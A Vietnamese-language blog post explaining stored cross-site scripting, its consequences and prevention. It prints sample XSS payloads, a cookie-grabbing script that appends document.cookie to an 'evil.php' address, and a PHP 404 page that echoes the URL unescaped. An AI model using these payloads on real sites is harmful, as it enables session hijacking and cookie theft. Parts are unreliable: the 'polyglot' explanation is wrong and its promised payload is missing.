---
title: Stored XSS (Cross Site Scripting) là gì và cách ngăn chặn
description: Cross Site Scripting(XSS) là gì, cách thức hoạt động ra sao và cách ngăn chặn.
slug: what-is-stored-xss
authors:
  - ducnguyen96
tags: [xss, web, app, backend, vulnerability, security, stored xss]
hide_table_of_contents: false
---

Stored XSS là kiểu tấn công XSS nguy hiểm nhất trong các loại XSS vì nó không chỉ tác động đến user tại thời điểm tấn công mà nó sẽ ảnh hưởng đến tất cả user vì mã độc đã được lưu ở phía server nên bất cứ user nào tương tác với server đều sẽ bị ảnh hưởng.

<!-- truncate -->

<article class="prose max-w-none">

## 1. Giải thích

Trong tấn công `Stored XSS`, các trang web lưu trữ mã độc trong database, file hoặc bộ nhớ của server.
Khi người dùng truy cập trang web, mã độc được thực thi trên trình duyệt của họ.
Đây là một loại tấn công XSS nguy hiểm hơn so với Reflected XSS vì nó có thể ảnh hưởng đến nhiều người dùng cùng một lúc.

Để thực hiện tấn công `Stored XSS`, tin tặc chỉ cần xác định lỗ hổng bảo mật phía backend cho phép thực hiện các request chứa mã độc.
Thường thì các lỗ hổng này là do việc validate dữ liệu đầu vào không đầy đủ, hoặc không kiểm tra dữ liệu đầu vào trước khi lưu vào database.

Một vài hậu quả của tấn công `Stored XSS`:

- **Session hijacking**: tin tặc có thể lấy được cookie của người dùng, từ đó có thể đăng nhập vào tài khoản của người dùng.
- **Privilege escalation**: tin tặc có thể thực hiện các hành động độc hại với quyền của người dùng.
- **Disclosure of sensitive information**: tin tặc có thể lấy được các thông tin nhạy cảm của người dùng.
- **Installation of malware/Trojan programs**: tin tặc có thể cài đặt các phần mềm độc hại, virus, trojan vào máy tính của người dùng.
- **Redirecting users to trustworthy-looking phishing pages**: tin tặc có thể chuyển hướng người dùng đến các trang web giả mạo để lấy thông tin đăng nhập của người dùng.
- **Web content spoofing**: tin tặc có thể thay đổi nội dung của trang web.

Khác với các loại XSS khác khi mà người dùng phải đăng nhập tại thời điểm tấn công thì mới bị dính mã độc. Trong Stored XSS thì mã độc được lưu trữ trong server và được thực thi bởi
browser của tất cả user có request đến server, điều này làm cho kiểu tấn công này nguy hiểm hơn nhiều.

## 2. Stored XSS payloads

Loại tấn công này thường nhắm vào những inputs như comments trên blog hay username, etc.

Một số loại payload thường được sử dụng:

### 2.1. Polyglot-Based XSS Payload

Kiểu này nhắm vào một lỗ hổng trong polygot - một framework cho phép thực thi code trong nhiều context trong raw form. Một polyglot XSS script thường sẽ trông như sau:

### 2.2. Image XSS

Payload này cho phép thực thi Javascript trong context của một `image`. Hacker thường sử dụng cách này để thực hiện các hành vi độc hại trên các trang như user profile hay các đường link ảnh khác.
Loại này sẽ trông như sau:

```html
<img src="javascript:alert('XSS');" />
```

### 2.3. Bypassing HTML entity encoding

```html
<img src='javascript:alert("XSS")' />
```

### 2.4. Improper `img` tags

```html
<IMG """>
<script>
  alert("XSS");
</script>
"\>
```

## 2. Một số cách hacker lợi dụng lỗ hổng XSS

### 2.1. Cookie Grabbing - trộm cookie

Hackers có thể trộm cookie từ một người dùng đã login và đã được xác thực(authenticated). Để làm được điều này thì hacker chỉ cần thêm đoạn code dưới đây vào bất cứ chỗ nào có user input,
chẳng hạn như user profiles, tin nhắn, forums, etc.

```html
<script type="text/javascript">
  var adr = "../evil.php?cakemonster=" + escape(document.cookie);
</script>
```

Đoạn code trên sẽ thực thi việc viết cookie vào file **evil.php** - nơi mà hacker có thể check lại kết quả của đoạn mã.

### 2.2. Thao túng page

Hacker cũng có thể nhắm vào các error messages chẳng hạn như trang 404.

```html
<html>
  <body>
    <? php
print "Not found:". urldecode($_SERVER["REQUEST_URI"]);
?>
  </body>
</html>
```

Nếu user click vào một trang không tồn tại chẳng hạn như **https://example.com/non_existent_file** thì sẽ nhận được response là **Not found: /non_existent_file**

Hackers có thể thao túng trang error này để thêm vào 1 đoạn mã độc chẳng hạn **https://example.com/<script>alert('test');</script>**, bây giờ mỗi khi user truy cập vào 1 trang không tồn tại thì sẽ được phản hồi bằng trang 404 nhưng giờ trang 404 ấy đã kèm theo mã độc.

## 3. Ngăn chặn lỗ hổng Stored XSS

- Thực hiện validate input đúng cách

- Sử dụng scanner để phát hiện lỗ hổng bảo mật

- Sử dụng `Content Security Policy` (CSP)

- `Escape` các nội dung động, không cho phép user submit raw HTML ở các inputs.

</article>
